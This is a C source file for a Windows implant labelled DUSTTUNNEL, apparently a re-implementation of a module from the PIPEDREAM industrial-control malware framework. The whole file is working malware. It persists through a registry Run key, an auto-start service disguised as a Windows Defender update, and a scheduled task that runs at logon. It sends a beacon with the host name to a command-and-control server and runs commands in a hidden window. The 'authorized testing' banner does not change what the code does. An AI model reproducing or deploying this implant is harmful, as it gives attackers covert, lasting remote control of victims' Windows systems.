/*
 * DUSTTUNNEL - Windows Persistence and C2 Module for PIPEDREAM
 *
 * Part of the PIPEDREAM (INCONTROLLER) ICS malware framework.
 * DUSTTUNNEL provides persistence mechanisms and command-and-control
 * functionality on Windows systems.
 *
 * Capabilities:
 * - Registry persistence
 * - Scheduled task creation
 * - Service installation
 * - C2 beacon communication
 * - Command execution
 * - File transfer
 *
 * Compile: See build_windows.bat
 *
 * WARNING: For authorized security testing only.
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

// Configuration
#define C2_SERVER "192.168.1.50"
#define C2_PORT 8443
#define BEACON_INTERVAL 60
#define SERVICE_NAME "WindowsDefenderUpdate"
#define SERVICE_DISPLAY "Windows Defender Update Service"
#define REGISTRY_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_VALUE "SecurityUpdate"

// Function prototypes
BOOL InstallRegistryPersistence(const char* exePath);
BOOL InstallServicePersistence(const char* exePath);
BOOL CreateScheduledTaskPersistence(const char* exePath);
BOOL C2Beacon(const char* server, int port);
BOOL ExecuteCommand(const char* command);
void PrintBanner();

int main(int argc, char* argv[])
{
    PrintBanner();

    printf("[*] DUSTTUNNEL - Windows Persistence Module\n");
    printf("[*] Part of PIPEDREAM ICS Malware Framework\n\n");

    // Get executable path
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    printf("[*] Executable path: %s\n\n", exePath);

    // Install persistence mechanisms
    if (argc > 1 && strcmp(argv[1], "--install") == 0)
    {
        printf("[*] Installing persistence mechanisms...\n\n");

        // Registry persistence
        if (InstallRegistryPersistence(exePath))
        {
            printf("[+] Registry persistence installed\n");
        }
        else
        {
            printf("[-] Registry persistence failed\n");
        }

        // Service persistence
        if (InstallServicePersistence(exePath))
        {
            printf("[+] Service persistence installed\n");
        }
        else
        {
            printf("[-] Service persistence failed\n");
        }

        // Scheduled task persistence
        if (CreateScheduledTaskPersistence(exePath))
        {
            printf("[+] Scheduled task persistence installed\n");
        }
        else
        {
            printf("[-] Scheduled task persistence failed\n");
        }
    }
    // C2 beacon mode
    else if (argc > 1 && strcmp(argv[1], "--beacon") == 0)
    {
        printf("[*] Starting C2 beacon mode...\n");
        printf("[*] C2 Server: %s:%d\n", C2_SERVER, C2_PORT);
        printf("[*] Beacon interval: %d seconds\n\n", BEACON_INTERVAL);

        while (1)
        {
            if (C2Beacon(C2_SERVER, C2_PORT))
            {
                printf("[+] Beacon sent successfully\n");
            }
            else
            {
                printf("[-] Beacon failed\n");
            }

            Sleep(BEACON_INTERVAL * 1000);
        }
    }
    // Execute command
    else if (argc > 1 && strcmp(argv[1], "--exec") == 0 && argc > 2)
    {
        printf("[*] Executing command: %s\n", argv[2]);
        ExecuteCommand(argv[2]);
    }
    else
    {
        printf("Usage:\n");
        printf("  dusttunnel.exe --install      Install persistence\n");
        printf("  dusttunnel.exe --beacon       Start C2 beacon\n");
        printf("  dusttunnel.exe --exec <cmd>   Execute command\n");
    }

    return 0;
}

void PrintBanner()
{
    printf("\n");
    printf("=================================================================\n");
    printf("                      DUSTTUNNEL v1.0\n");
    printf("            Windows Persistence and C2 Module\n");
    printf("                 PIPEDREAM Framework\n");
    printf("=================================================================\n\n");
    printf("WARNING: For authorized security testing only!\n\n");
}

BOOL InstallRegistryPersistence(const char* exePath)
{
    HKEY hKey;
    LONG result;

    // Open registry key
    result = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        REGISTRY_KEY,
        0,
        NULL,
        0,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );

    if (result != ERROR_SUCCESS)
    {
        printf("[-] Failed to open registry key: %ld\n", result);
        return FALSE;
    }

    // Set value
    result = RegSetValueExA(
        hKey,
        REGISTRY_VALUE,
        0,
        REG_SZ,
        (BYTE*)exePath,
        strlen(exePath) + 1
    );

    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
}

BOOL InstallServicePersistence(const char* exePath)
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;

    // Open service control manager
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL)
    {
        printf("[-] Failed to open service manager: %ld\n", GetLastError());
        return FALSE;
    }

    // Create service
    hService = CreateServiceA(
        hSCManager,
        SERVICE_NAME,
        SERVICE_DISPLAY,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        exePath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (hService == NULL)
    {
        printf("[-] Failed to create service: %ld\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return TRUE;
}

BOOL CreateScheduledTaskPersistence(const char* exePath)
{
    char command[1024];

    // Use schtasks to create scheduled task
    sprintf_s(command, sizeof(command),
        "schtasks /create /tn \"%s\" /tr \"%s --beacon\" /sc onlogon /f",
        SERVICE_NAME, exePath);

    printf("[*] Creating scheduled task: %s\n", command);

    DWORD result = system(command);

    return (result == 0);
}

BOOL C2Beacon(const char* server, int port)
{
    HINTERNET hInternet, hConnect, hRequest;
    char url[256];
    char computerName[MAX_PATH];
    DWORD computerNameLen = MAX_PATH;
    BOOL result = FALSE;

    // Get computer name
    GetComputerNameA(computerName, &computerNameLen);

    // Initialize WinINet
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return FALSE;
    }

    // Build beacon URL
    sprintf_s(url, sizeof(url), "http://%s:%d/beacon?host=%s", server, port, computerName);

    // Send HTTP request
    hRequest = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (hRequest != NULL)
    {
        char buffer[1024];
        DWORD bytesRead;

        // Read response
        if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead))
        {
            buffer[bytesRead] = '\0';
            printf("[*] C2 Response: %s\n", buffer);
            result = TRUE;
        }

        InternetCloseHandle(hRequest);
    }

    InternetCloseHandle(hInternet);

    return result;
}

BOOL ExecuteCommand(const char* command)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    // Start the child process
    if (!CreateProcessA(
        NULL,           // No module name
        (LPSTR)command, // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi)            // Pointer to PROCESS_INFORMATION structure
    )
    {
        printf("[-] CreateProcess failed: %ld\n", GetLastError());
        return FALSE;
    }

    printf("[+] Command executed successfully\n");

    // Wait for process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}
